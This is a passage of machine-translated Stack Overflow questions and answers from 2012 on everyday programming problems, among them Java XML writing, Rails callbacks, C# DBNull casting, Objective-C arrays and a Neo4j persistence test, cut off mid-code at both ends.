       for(int x = 0; x < array.length; x++)
          System.out.println(array[x])
    }
} 
```

# caching - 在 n 路集合关联缓存中访问同一集合中的元素

> ID：13548655
> 
> 赞同：1
> 
> 时间：2012-11-25T05:42:55.400
> 
> 标签：caching, set, cpu-cache

如果您不知道关联性级别或缓存本身的大小，是否有任何方法可以保证您仅访问映射到 n 路集关联缓存中相同集的块？我知道给定关联级别或缓存大小都可以做到这一点，但在这种特殊情况下，我所得到的只是对缓存大小的低估计。我已经考虑了一段时间，我开始相信这是不可能的，但我不确定。

为了这个问题，请假设不可能通过任何方式获得关联级别或缓存大小。

这样做的原因是我试图定量确定关联性的级别，但是我用来定量确定缓存大小的算法只给出了缓存大小的精确结果，它是 2 的幂，它给出了最接近的 2 的幂估计否则。不幸的是，我目前正在运行的机器有一个 3MB L2 缓存。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T01:46:22.127

在进行更多研究并询问计算机体系结构教授之后，似乎没有万无一失的方法来保证如果您不知道缓存大小或缓存的关联性，您只会访问映射到同一组的块。

给定缓存大小 N，您可以访问由 N 字节或 N 字节的任意倍数分隔的数组元素，并且随后拉入的每个块都将映射到同一个集合。这是保证您只访问映射到同一集合的块的最简单方法。

如果你不知道缓存大小，你能做的最好的就是估计。例如，如果您访问以 32MB 分隔的数组元素，那么您可以保证仅访问映射到相同集合的任何缓存大小的块，该缓存大小是 2 的幂，最大为 32MB。奇数大小的缓存不会有同样的保证。

# ruby-on-rails - 使用 WS-Security 工具保护由 Ruby on Rails 框架创建的 Web 应用程序

> ID：13548656
> 
> 赞同：4
> 
> 时间：2012-11-25T05:43:17.860
> 
> 标签：ruby-on-rails, ruby, security

使用 Ruby on Rails 框架开发的 Web 应用程序是否可以使用第三方安全工具拦截对其的所有调用？对该 Web 应用程序的任何调用都会转到安全工具而不是 Web 应用程序本身，然后安全工具可以将其重定向到 Web 应用程序。

在响应端类似，Web 应用程序响应在发送到客户端（浏览器）之前被安全工具拦截

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-22T00:33:26.837

如果我了解您想要正确执行的操作，您可以使用 befor_methods 来执行此操作

回调是 Active Record 对象生命周期的挂钩，允许您在更改对象状态之前或之后触发逻辑。这可用于确保在调用destroy（通过覆盖before_destroy）或在验证属性之前（通过覆盖before_validation）删除关联和依赖对象。作为发起回调的示例，考虑 Base#save 调用新记录：

```
(-) save

(-) valid

(1) before_validation

(-) validate

(2) after_validation

(3) before_save

(4) before_create

(-) create

(5) after_create

(6) after_save

(7) after_commit 
```

此外，可以将 after_rollback 回调配置为在发出回滚时触发。查看 ActiveRecord::Transactions 以获取有关 after_commit 和 after_rollback 的更多详细信息。

此外，每当触摸对象时都会触发 after_touch 回调。

最后，为查找器找到并实例化的每个对象触发 after_find 和 after_initialize 回调，并且在实例化新对象后也触发 after_initialize。

总共有 19 个回调，它们为您提供了巨大的能力来为 Active Record 生命周期中的每个状态做出反应和准备。为现有记录调用 Base#save 的顺序类似，除了每个 _create 回调被相应的 _update 回调替换。

**例子：**

```
class CreditCard < ActiveRecord::Base
  # Strip everything but digits, so the user can specify "555 234 34" or
  # "5552-3434" and both will mean "55523434"
  before_validation(on: :create) do
    self.number = number.gsub(/[^0-9]/, "") if attribute_present?("number")
  end
end

class Subscription < ActiveRecord::Base
  before_create :record_signup

  private
    def record_signup
      self.signed_up_on = Date.today
    end
end

class Firm < ActiveRecord::Base
  # Destroys the associated clients and people when the firm is destroyed
  before_destroy { |record| Person.destroy_all "firm_id = #{record.id}"   }
  before_destroy { |record| Client.destroy_all "client_of = #{record.id}" }
end 
```

# java - 如何用java附加到xml表？

> ID：13548657
> 
> 赞同：1
> 
> 时间：2012-11-25T05:43:27.333
> 
> 标签：java, xml, append

好的，所以我正在创建一个用户类，它要求输入，然后使用 java 将其存储在 XML 文件中。我想创建我认为的原始 XML 文件，但我无法弄清楚如何添加一个新用户，其属性“id”比上一个用户条目多一个。

这是我到目前为止的代码：

```
/*imports */

    public class CreateUser {   
        static Scanner input = new Scanner(System.in);

/* object names*/
    String name;
    String age;
    String bday;
    String gender;
    String location;
    String orientation;
    String relationship;
    String hobbies;
    String choice;
    String username;
    String password;

    public void makeUser(){

/*left out code to get user entries here 

seemed irrelevant/*

    /*checks for file if it doesn't exist then it creates it else it should append
 the user to the xml document with a id increase of one.
 The appending part I'm not sure how to do.*/
File f = new File("C:\\Users\\Steven\\Workspace\\twitter\\src\\users.xml");
            if(f.exists()) { 
                try {
                    /* need help here*/
                }
            }
            else{
                try{
                    DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
                    DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
                    Document users = docBuilder.newDocument();

                    Element user = users.createElement("user");
                    users.appendChild(user);

                    Attr attr = users.createAttribute("id");
                    attr.setValue("0");
                    user.setAttributeNode(attr);

                    Element dname = users.createElement("name");
                    dname.appendChild(users.createTextNode(name));
                    user.appendChild(dname);

                    Element dgender = users.createElement("gender");
                    dgender.appendChild(users.createTextNode(gender));
                    user.appendChild(dgender);

                    Element dlocation = users.createElement("location");
                    dlocation.appendChild(users.createTextNode(location);
                    user.appendChild(dlocation);

                    Element dorientation = users.createElement("orientation");
                    dorientation.appendChild(users.createTextNode(orientation));
                    user.appendChild(dorientation);

                    Element drelationship = users.createElement("relationship");
                    drelationship.appendChild(users.createTextNode(relationship));
                    drelationship.appendChild(drelationship);

                    Element dhobbies = users.createElement("hobbies");
                    dhobbies.appendChild(users.createTextNode(hobbies));
                    dhobbies.appendChild(dhobbies);

                    Element dchoice = users.createElement("choice");
                    dchoice.appendChild(users.createTextNode(choice));
                    dchoice.appendChild(dchoice);

                    Element dusername = users.createElement("username");
                    dusername.appendChild(users.createTextNode(username));
                    dusername.appendChild(dusername);

                    Element dpassword = users.createElement("password");
                    dpassword.appendChild(users.createTextNode(password));
                    dpassword.appendChild(dpassword);

                    Element dbday = users.createElement("birthday");
                    dbday.appendChild(users.createTextNode(bday));
                    dbday.appendChild(dbday);

                    Element dage = users.createElement("age");
                    dage.appendChild(users.createTextNode(age));
                    dage.appendChild(dage);

                    TransformerFactory transformerFactory = TransformerFactory.newInstance();
                    Transformer transformer = transformerFactory.newTransformer();
                    DOMSource source = new DOMSource(users);
                    StreamResult result = new StreamResult(new File("C:\\Users\\Steven\\Workspace\\twitter\\src\\users.xml"));

                    StreamResult test = new StreamResult(System.out);
                    transformer.transform(source, result);
                } catch (ParserConfigurationException pce) {
                    pce.printStackTrace();
                } catch (TransformerException tfe) {
                    tfe.printStackTrace();
                }
            }
        } 
```

我知道它有很多代码要查看，我不想要一个精确的编码答案，但也许只是如何将属性值附加到上一个条目之后的用户。或者指向一个有用的网站的方向。任何事情真的让我有点困惑，我觉得我应该得到这么简单的东西。提前感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:09:55.687

在您的第一部分（`if`块）中，我认为您可以如下以附加模式打开文件以添加`user`，**假设`user`节点未包装在另一个节点中。**

```
 StreamResult result = new StreamResult(
    new FileWriter("C:\\Users\\Steven\\Workspace\\twitter\\src\\users.xml", true)); 
```

上面的语句有两个变化：

1.  使用`FileWriter`代替`File`
2.  使用第二个参数`true`，以`append`模式打开文件。

**编辑**：要获得最大现有 ID，您需要读取文件并查找 ID 标签，如下所示：

```
 File xmlFile = new File("C:\\Users\\Steven\\Workspace\\twitter\\src\\users.xml");
  DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
  DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
  Document doc = dBuilder.parse(xmlFile);
  doc.getDocumentElement().normalize();
  NodeList nList = doc.getElementsByTagName("userId");//use the id tag name
  int maxId = 0;
  for(Node node: nList){
      if(Integer.parseInt(node.getTextContent()) > maxId ){
        maxId = Integer.parseInt(node.getTextContent());
      }
  }
  int newId = maxId +1; //use this ID
  xmlFile.close();//close the file 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T07:00:09.090

考虑 JAXB，这是一个开始的工作示例：

```
static class Users {
    private List<User> user = new ArrayList<>();

    public List<User> getUsers() {
        return user;
    }

    public void setUsers(List<User> users) {
        this.user = users;
    }
}

static class User {
    private String name;

    public void setName(String name) {
        this.name = name;
    }

    public String getName() {
        return name;
    }
}

public static void main(String[] args) throws Exception {
    User user = new User();
    user.setName("user1");
    Users users = new Users();
    users.setUsers(Arrays.asList(user));

    JAXB.marshal(users, new File("users.xml"));

    users = JAXB.unmarshal(new File("users.xml"), Users.class);
    User user2 = new User();
    user2.setName("user2");
    users.getUsers().add(user2);

    JAXB.marshal(users, System.out);

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T08:45:42.547

考虑一下 SAX，与 DOM 不同，它速度快且没有大小限制。这是一个基本示例：

```
public static void main(String[] args) throws Exception {
    String xml = "<users><user><name>user1</name></user></users>";
    XMLReader xr = new XMLFilterImpl(XMLReaderFactory.createXMLReader()) {
        @Override
        public void endElement(String uri, String localName, String qName) throws SAXException {
            if (qName.equals("users")) {
                addUser();
            }
            super.endElement(uri, localName, qName);
        }

        private void addUser() throws SAXException {
            super.startElement("", "", "user", null);
            addFileld("name", "user2");
            super.endElement("", "", "user");
        }

        private void addFileld(String name, String value) throws SAXException {
            super.startElement("", "", name, null);
            super.characters(value.toCharArray(), 0, value.length());
            super.endElement("", "", name);
        }
    };
    Source src = new SAXSource(xr, new InputSource(new StringReader(xml)));
    Result res = new StreamResult(System.out);
    TransformerFactory.newInstance().newTransformer().transform(src, res);
} 
```

输出：

```
 <users><user><name>user1</name></user><user><name>user2</name></user></users> 
```

# c# - 使用数字 updown 遍历数组

> ID：13548659
> 
> 赞同：2
> 
> 时间：2012-11-25T05:43:57.333
> 
> 标签：c#, arrays, winforms

我正在尝试使用数字 updown 在一个数组中来回移动，该数组存储用户进行的打字测试的分数。老实说，我什至不知道从哪里开始。我写了一些代码，但它似乎没有做任何事情。

```
 private void testUpDown_ValueChanged(object sender, EventArgs e)
    {
        foreach (testUpDown.Value = allTests[i])
        {
            prevErrorsBox = Errors.ToString();
            prevWpmBox = WPM.ToString();
        }
    } 
```

正如您可以想象的那样，它并没有做很多事情。我应该为此使用不同的控件吗？如果重要的话，这是通过 3 层设计完成的。我还必须让这个表单从数据库中加载值。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:05:41.540

您需要使用向上/向下控件更改数组的索引，确保您不能超出数组的边界。看看这样的东西是否适合你。

```
public partial class Form1 : Form
{
    string[] values;
    public Form1()
    {
        InitializeComponent();
        values = setValueArray();
        numericUpDown1.Maximum = values.Length - 1;
        numericUpDown1.Minimum = 0;
    }

    private string[] setValueArray()
    {
     return new string[] { "100", "90", "80", "70", "60" };
    }

    private void numericUpDown1_ValueChanged(object sender, EventArgs e)
    {
        label1.Text = values[(int)((NumericUpDown)sender).Value];
    }
} 
```

# objective-c - Objective C，迷宫生成和二维数组

> ID：13548660
> 
> 赞同：1
> 
> 时间：2012-11-25T05:44:00.037
> 
> 标签：objective-c, multidimensional-array, maze

我需要生成一个给定宽度和高度的随机迷宫。我可以在 Perl 中使用深度优先搜索算法执行此操作，其中我使用 2D 数组，如下所示：

```
 for my $i (0 .. $h - 1) {
        for my $j (0 .. $w - 1) {
            push @{ $cell[$i] }, '1';
        }
        push @{ $cell[$i] }, '0';
    }
    for my $i (0 .. $w) {
        $cell[$h][$i] = '';
    } 
```

在 Objective C 中，没有二维数组。我现在有点迷路了。Objective C 中二维数组的等价物是什么，所以我几乎可以使用与 Perl 中相同的数据结构？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:51:18.880

一种方法是使用 Objective-C 样式的数组：

```
NSMutableArray *cell = [NSMutableArray arrayWithCapacity:h];
for (int i=0; i<h; ++i) {
    NSMutableArray *row = [NSMutableArray arrayWithCapacity:w];
    for (int j=0; j<w; ++j) {
        // use a random number
        [row addObject:[NSNumber numberWithInt:rand()]];
    }
    // add one row
    [cell addObject:row];
} 
```

另一种方法是使用 C 样式数组：

```
int **cell = malloc(h*sizeof(int *));
for (int i=0; i<h; ++i) {
    cell[i] = malloc(w*sizeof(int));
    for (int j=0; j<w; ++j) {
        cell[i][j] = rand();
    }
}

// after you used it remeber to free it
for (int i=0; i<h; ++i) {
    free(cell[i]);
}
free(cell);
cell = NULL; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-01T07:41:38.870

使用这个 github 库来生成迷宫。
[https://github.com/DoubleEqual/MazeGenerator-tool](https://github.com/DoubleEqual/MazeGenerator-tool)

24x24 迷宫的结果如下所示：

![在此处输入图像描述](../Images/b36c6026433cc94488c155e5fd1392bd.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:42:20.773

二维或 N 维数组只不过是一种存储数据的方式。如果你想要一个二维数组，它相当简单，但在 obj-c 中有点棘手，你必须创建第二级数组，然后将其插入第一级。

请参阅下面的代码：

```
NSMutableArray *twoDArray = [NSMutableArray new]; //this is first level

//below are second level arrays inserted in index 0 to 2.
[twoDArray insertObject:[NSMutableArray arrayWithObjects:@"00",@"01",@"02",nil] atIndex:0];
[twoDArray insertObject:[NSMutableArray arrayWithObjects:@"10",@"11",@"12",nil] atIndex:1];
[twoDArray insertObject:[NSMutableArray arrayWithObjects:@"20",@"21",@"22",nil] atIndex:2]; 
```

# jquery - 为全屏背景图像实现 jquery-anystretch 时出现问题。

> ID：13548662
> 
> 赞同：4
> 
> 时间：2012-11-25T05:44:44.400
> 
> 标签：jquery, background-image

我正在尝试将 Jquery Anystretch 实施到我的网站中，但未能使其正常工作。Jquery Anystretch 将允许我拥有可调整大小的完整图像背景。以下是我到目前为止所拥有的。任何帮助都会很棒。该网站是[http://www.jobspark.ca](http://www.jobspark.ca)

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>

<script type="text/javascript" src="/jquery.anystretch.min.js"></script>

<script type="text/javascript"> $.anystretch("/storage/fullimagebackground2.jpg", {speed: 150}); </script> 
```

这是 Github 链接[https://github.com/danmillar/jquery-anystretch](https://github.com/danmillar/jquery-anystretch)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T15:20:46.910

我不明白你为什么要使用 javascript 作为整页背景，因为浏览器可能关闭了 javascript。对此也有 CSS 解决方案。

您可能想阅读以下有关此主题的 CSS 技巧的文章，它们还涵盖了 jQuery 方法。

[http://css-tricks.com/perfect-full-page-background-image/](http://css-tricks.com/perfect-full-page-background-image/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-20T15:28:38.717

Rofavadeka 是对的，如果您要制作全屏拉伸背景，只需使用 CSS。只需像这样写一个图像标签：

```
<img src="..." style="position:fixed;top:0px;left:0px;bottom:0px;right:0px;" /> 
```

只要它放在页面上的所有其他内容之上（或具有较低的 Z 索引），它就会出现在其他所有内容之后。

# php - codeigniter中的php数组输出

> ID：13548664
> 
> 赞同：-1
> 
> 时间：2012-11-25T05:45:15.697
> 
> 标签：php, arrays, codeigniter

我的数组是 `Array ( [0] => Array ( [0] => Array ( [book_title] => Brief History of Time: From Big Bang to Black Hole [pd_id] => p22670689244706 [price] => 499.00 [author] => Stephen W. Hawking [book_type] => pb [status] => Pending ) ) [1] => Array ( [0] => Array ( [book_title] => The Art of Computer Programming, Volume 4A [pd_id] => p23662839087202 [price] => 899.00 [author] => Donald E. Knuth [book_type] => pb [status] => Pending ) ) )`

如何在 codeigniter 的视图页面中打印`book_title`、定价？`book_type`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:50:00.973

鉴于您的数组被调用`$array`，您可以这样做：

```
foreach ($array as $arr) {
   foreach ($arr as $ar) {
      echo $ar['book_title'];
      echo $ar['price'];
      echo $ar['book_type'];
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:57:48.590

您必须使用 foreach 循环两次才能获取值...

尝试这个...

```
foreach ($arrayName as $result){ // first loop gets all the value inside first array  
    foreach($result as $row){   //second gets the value inside the first array..
        echo $row['book_title'];
        echo $row['price'];
        echo $row['book_type'];
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T11:07:33.197

**在您的应用程序/视图**文件夹中创建视图“listing.php”在其中添加此代码

```
<html>
<head>
<title>Book listing</title>
</head>
<body>
    <?php
    foreach ($books as $book) {           
     echo $book['book_title'] .' -- ' . $book['price'] .' -- ' . $book['book_type']. '<br>';
    }
?>
</body>
</html> 
```

在您的**控制器**功能中编写这样的代码

```
$data['books'] = $yourArray; //@todo : replace your array name with $yourArray
$this->load->view('listing', $data); 
```

# c# - 当 DateTime 字段为空时，LINQ 中的“指定转换无效”

> ID：13548676
> 
> 赞同：1
> 
> 时间：2012-11-25T05:47:22.610
> 
> 标签：c#, exception, datetime

我有问题。这是我的代码使用 LINQ。

```
var resultCases = from row2 in dtCases.AsEnumerable()
                  where row2.Field<int>("caseID") == caseID2
                  select new
                  {
                              caseName = row2["caseName"].ToString(),
                              caseCourtPlace = row2["caseCourtPlace"].ToString(),
                              caseCourtRef = row2["caseCourtRef"].ToString(),
                              caseOfficeRef = row2["caseOfficeRef"].ToString(),
                              effectiveDate = ((DateTime)row2["caseEffectiveDate"]),
                              closedDate = ((DateTime)row2["caseClosedDate"]),
                              caseFolderPath = row2["casesFolderPath"].ToString(),
                              category = row2["categoryName"].ToString(),
                              department = row2["departmentName"].ToString(),
                              empName = row2["empName"].ToString(),
                              judgeName = row2["judgeName"].ToString(),
                              asName = row2["asCasesName"].ToString(),
                  }; 
```

如果`closedDate`或`effectiveDate`返回`DBnull.Value`，我得到

> *未处理 InvalidCastException - 指定的强制转换无效。*

那么如何防止这个错误呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-27T22:28:33.700

tldr; **问题有两个方面：DataTable 用于`DBNull.Value`表示“空”值，并且既不`DBNull.Value`或`null`不可转换为`DateTime`.**

[`Field<T>`](http://msdn.microsoft.com/en-us/library/bb298042.aspx)后来添加了扩展方法，使处理具有空值的 DBNull 和 Nullable/引用类型更加容易；它还将转换隐藏在强类型签名后面。这些[LINQ to DataSet](http://msdn.microsoft.com/en-us/library/bb386977.aspx)扩展方法[知道如何适当地映射`DBNull.Value`到`null`](https://stackoverflow.com/questions/1039761/the-point-of-the-field-extension-method)。

因为这个 using将`row.Field<DateTime?>("caseEffectiveDate")`返回*一个*`DateTime?`值（如果查询返回一个值）或`null`，如果服务器返回一个不兼容的值，它也可能抛出异常 - 但它*永远不会*返回`DBNull.Value`。

但是，该标准`row["caseEffectiveDate"]`将返回一个`DateTime`值（或其他类型）或*不能*转换为`DBValue.Null`（更不用说 a ）并导致所描述的错误。*`DateTime?``DateTime`*

 *以下是最小化重现此异常的方法：

```
object v = DBNull.Value;
DateTime dt = (DateTime)v; 
```

但是，可以将 a 转换`null`为 a `DateTime?`：

```
object v = null;
DateTime? maybeDt = (DateTime?)v; 
```

然后在需要时将其合并为微不足道的`DateTime`：

```
object v = null;
DateTime? dt = (DateTime?)v ?? DateTime.MinValue; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:50:49.503

**更新**：试试这个

```
public static class ConversionExtensions
{
    public static string SafeDateTime(this object value)
    {
        if (value == DBNull.Value) return string.Empty;

        var valueType = value.GetType();
        if (typeof (DateTime?).IsAssignableFrom(valueType))
        {
            var nullableValue = value as DateTime?;
            if (nullableValue == null) return string.Empty;
            return nullableValue.Value.ToString();
        }
        if (typeof (DateTime).IsAssignableFrom(valueType))
        {
            return ((DateTime) value).ToString();
        }
        return string.Empty;
    }
} 
```

调用：

```
effectiveDate = row2["caseEffectiveDate"].SafeDateTime() 
```*

# ruby-on-rails - 如何将数据从表单传递到方法（Rails）

> ID：13548678
> 
> 赞同：-1
> 
> 时间：2012-11-25T05:48:00.757
> 
> 标签：ruby-on-rails

没关系。我根本不知道我可以使用 params[:fieldname]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:07:20.543

你的问题没有提供信息。您能否提供更多信息。关于你想做什么？

无论如何，你可以这样做：

```
 <% form_tag url_for(:action => 'method_name', :param_name => "abc" )
     ...
  <% end %> 
```

在控制器中：

```
 def method_name
    p = params[:param_name]
  end 
```

# java - 如何在 JavaFX 中将鼠标和事件处理程序组合在一起？

> ID：13548683
> 
> 赞同：3
> 
> 时间：2012-11-25T05:48:57.730
> 
> 标签：java, javafx-2

我正在创建这个典型的图形软件，在每次单击时添加一个节点，在`Shift`+单击节点上绘制一个顶点等。所以我想创建一些用于触发算法的鼠标键组合。例如，Alt+K+Click 事件变成 Kruskal 图 ....

到目前为止，我已经完成了：

```
root.setOnMouseClicked(new EventHandler<MouseEvent>() {
        @Override
        public void handle(MouseEvent t) {
        if (t.isAltDown()) {

            root.setOnKeyPressed(new EventHandler<KeyEvent>() {
                    @Override
                    public void handle(KeyEvent k) {
                       System.out.println(k.getText());
        }
.....
.....
} 
```

我得到了一个“扫描”键缓冲区，但我不知道如何阻止它，k.consume 不起作用......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T14:26:20.643

如果将要作为 ActionListener 执行的操作添加到 MenuItem，则可以使用 MenuItem 加速器属性指定将触发它的组合键。一些很好的例子：[http ://thierrywasyl.wordpress.com/2012/08/01/keyboard-shortcuts-and-mnemonic-in-javafx/](http://thierrywasyl.wordpress.com/2012/08/01/keyboard-shortcuts-and-mnemonic-in-javafx/)

# java - 如何在 Android 中将 JSON 参数作为 Web 服务请求发送？

> ID：13548687
> 
> 赞同：2
> 
> 时间：2012-11-25T05:49:31.607
> 
> 标签：java, android, json, web-services, httpclient

> **可能重复：**
> [如何通过 Android 请求发送 JSON 对象？](https://stackoverflow.com/questions/3027066/how-to-send-a-json-object-over-request-with-android)

由于我是 Android 开发的新手，我遇到了一个以 JSON 形式向 Web 服务发送请求的问题。谷歌搜索，我发现[以下代码](http://lukencode.com/2010/04/27/calling-web-services-in-android-using-httpclient/)用于使用参数发送请求。这是我们发送参数形式的 Java 类：

主.java

```
RestClient client = new RestClient(LOGIN_URL);
client.AddParam("Email", _username);
client.AddParam("Passwd", _password);

try {
  client.Execute(RequestMethod.POST);
} catch (Exception e) {
  e.printStackTrace();
}
String response = client.getResponse(); 
```

但是这里我想以 JSON 的形式发送参数，例如我想以这种形式发送参数：

```
{
  "login":{
    "Email":_username,
    "Passwd":_password,
  }
} 
```

那么，任何人都可以帮助我吗？如何以 JSON 的形式发送参数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:02:31.823

您发布的示例使用某人放在一起的“库”作为 Apache 的 HttpClient 类的包装器。这不是一个特别好的。但是您根本不需要使用该包装器，HttpClient 本身使用起来非常简单。这是您可以构建的代码示例：

```
final String uri = "http://www.example.com";
final String body = String.format("{\"login\": {\"Email\": \"%s\", \"Passwd\": \"%s\"}", "me@email.com", "password");

final HttpClient client = new DefaultHttpClient();
final HttpPost postMethod = new HttpPost(uri);
postMethod.setEntity(new StringEntity(body, "utf-8"));

try {
    final HttpResponse response = client.execute(postMethod);
    final String responseData = EntityUtils.toString(response.getEntity(), "utf-8");
} catch(final Exception e) {
    // handle exception here
} 
```

请注意，您很可能会使用 JSON 库来序列化 POJO 并创建请求 JSON。

# c# - 浮点数据类型的问题

> ID：13548688
> 
> 赞同：0
> 
> 时间：2012-11-25T05:49:53.233
> 
> 标签：c#, sql-server-2008

我有一个 radnumeric 文本框，月薪如下。txtMonthlySalary.Text=816177200 现在我需要计算年薪并将其保存为sql server表中的float变量。我的表已经存在，年薪字段为float类型。

年薪实际计算得出以下结果：年薪= 816177200 * 12 = 9,794,126,400

但是在程序中，float Fld_AnnualSalary = float.Parse(txtMonthlySalary.Text) * 12; 结果为 9,794,127,000

这里的浮点数据类型对看起来的结果进行了四舍五入，这与实际预期结果有很大差异。我该如何处理这个问题，这样我就可以在不四舍五入的情况下获得乘法的确切结果，并将其保存在 sql server 表中的 float 变量中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T05:56:34.023

`float`甚至`double`不是通常可接受的数据类型来处理真实货币值（正如您刚刚为自己证明的那样）。

请`Decimal`在 SQL 中的代码和对应类型中使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:01:19.180

[浮点数](http://msdn.microsoft.com/en-us/library/b1e65aza%28v=vs.80%29.aspx)的精度限制为大约七位数，而您正在尝试对九位数进行计算`816177200`。

Alexeis Levenkov 的答案包含您问题的解决方案。[Decimal](http://msdn.microsoft.com/en-US/library/364x0z75%28v=vs.80%29.aspx)数据类型至少可以包含 28 个有效数字。

# jquery-ui-draggable - 单击内部div时jQueryUI可拖动外部div

> ID：13548702
> 
> 赞同：1
> 
> 时间：2012-11-25T05:54:35.803
> 
> 标签：jquery-ui-draggable

我创建了一个效果很好的可拖动 div，如下所示：

```
<div id="outerdiv">
   <div id="titlediv">Some Text</div>
   <div id="rowdiv">Some more text</div>
   <div id="rowdiv">Some more text</div>
</div> 
```

在 jQueryUI 中将其链接起来：

```
$('#outerdiv').draggable(); 
```

但是，我想要的是使“#titlediv”可拖动，这样只有当您单击该部分时，您才能拖动外部 div。

即 div 内的第一行是标题，拖动时会导致整个 div 拖动。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T09:07:30.357

您可以使用[句柄](http://api.jqueryui.com/draggable/#option-handle)选项：

```
$("#outerdiv").draggable({
    handle: "#titlediv"
}); 
```

# neo4j - 一个简单用例上的 Neo4j 节点持久性问题

> ID：13548703
> 
> 赞同：3
> 
> 时间：2012-11-25T05:54:35.727
> 
> 标签：neo4j, spring-data, spring-data-neo4j

我目前正在实施一些测试样本来学习 Neo4j 和 Spring 数据，感谢 cineast 项目和其他样本，如 spring-data hello-worlds ...

不幸的是，我现在面临一个我不明白的问题，即使我已经在我的代码和其他示例代码上的 eclipse 调试器上花费了一些时间来尝试编译并找到解决方案。这个问题对我来说尤其困难，因为我无法验证 Neo4j 的持久性，即使它真的应该是一个微不足道的用例......

这是我正在测试的课程：

```
@NodeEntity 
public class SimplePersonImpl {
@GraphId 
private Long nodeId;

@Indexed
private String    id        = null;

@Indexed(indexType=IndexType.FULLTEXT, indexName = "LastName")
private String    lastName  = null;
@Indexed(indexType=IndexType.FULLTEXT, indexName = "FirstName")
private String    firstName = null;

public SimplePersonImpl() {

}

public SimplePersonImpl(String firstName_, String lastName_) {
    this.firstName=firstName_;
    this.lastName=lastName_;
    this.id=this.firstName+"."+this.lastName;
}

public String getID() {
    return this.id;
}

public String getFirstName() {
    return this.firstName;
}

public String getLastName() {
    return this.lastName;
}

public void setID(String id_) {
    this.id=id_;
}

public void setFirstName(String firstName_) {
    this.firstName=firstName_;
}

public void setLastName(String lastName_) {
    this.lastName=lastName_;
}

@Override
public boolean equals(Object o) {
    if (this == o) return true;
    if (o == null || getClass() != o.getClass()) return false;

    SimplePersonImpl person = (SimplePersonImpl) o;
    if (nodeId == null) return super.equals(o);
    return nodeId.equals(person.nodeId);

}

@Override
public int hashCode() {
    return nodeId != null ? nodeId.hashCode() : super.hashCode();
}

@Override
public String toString() {
    return String.format("Person{first name='%s', last name='%s'}", firstName, lastName);
}
} 
```

我目前正在测试这个类，感谢以下 jUnit 测试用例：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration({"/yes-test-context.xml"})
@Transactional
public class SimplePersonImplTest {
@Autowired Neo4jTemplate template;

@Rollback(false)
@BeforeTransaction
public void cleanUpGraph() {
    Neo4jHelper.cleanDb(template);
}

@Test @Transactional
public void persistedPersonShouldBeRetrievableFromGraphDB() {
    SimplePersonImpl qqun          = template.save(new SimplePersonImpl());
    SimplePersonImpl retrievedQqun = template.findOne(qqun.getNodeId(), SimplePersonImpl.class);
    assertEquals("retrieved person matches persisted one", qqun, retrievedQqun);
}

@Test @Transactional
public void persistedPersonWithPropertiesShouldBeRetrievableFromGraphDB() {
    SimplePersonImpl qqun = template.save(new SimplePersonImpl("testFN","testLN"));

    SimplePersonImpl retrievedQqun = template.findOne(qqun.getNodeId(), SimplePersonImpl.class);
    assertEquals("check memory first name matches persisted one", qqun.getFirstName(), retrievedQqun.getFirstName());       
    assertEquals("check memory last name matches persisted one", qqun.getLastName(), retrievedQqun.getLastName());
}
} 
```

第一个测试运行成功，但第二个测试失败。使用 eclipse 调试器检查时，我可以看到：

*   保存方法后返回一个 SimplePersonImpl qqun 具有正确的 firtName、lastName 和 id 值。但是 nodeId 为空，我不明白为什么。但是由于这种行为在 spring-data hello-worlds 示例中是相同的，我想我的问题不是来自那里。
*   在 findOne 方法中，即使我的 qqun 对象中的 nodeId 为空，qqun.getNodeId() 也会返回 1。我不明白这个值是从哪里来的，但让我们继续
*   findOne 方法返回一个检索到的Qqun。所有检索到的Qqun 属性均为空，这似乎是我在 firstName 上的第一个 assertEquals 失败的原因。

在这里，我真的不明白我在哪里做错了（我想我做错了），但很明显 spring-data neo4j 持久性背后有很多我不明白的事情。我很乐意在这些点上得到一些答案（为什么我在保存调用后看到 nodeId=null ？为什么我检索一个所有属性都为 null 的非 null 对象？...）。

可能出现一些错误的最后一点是我的测试上下文配置，但我还是看不出问题出在哪里：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:context="http://www.springframework.org/schema/context" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:neo4j="http://www.springframework.org/schema/data/neo4j"
xmlns:tx="http://www.springframework.org/schema/tx"
xsi:schemaLocation="
    http://www.springframework.org/schema/beans 
    http://www.springframework.org/schema/beans/spring-beans.xsd
    http://www.springframework.org/schema/context 
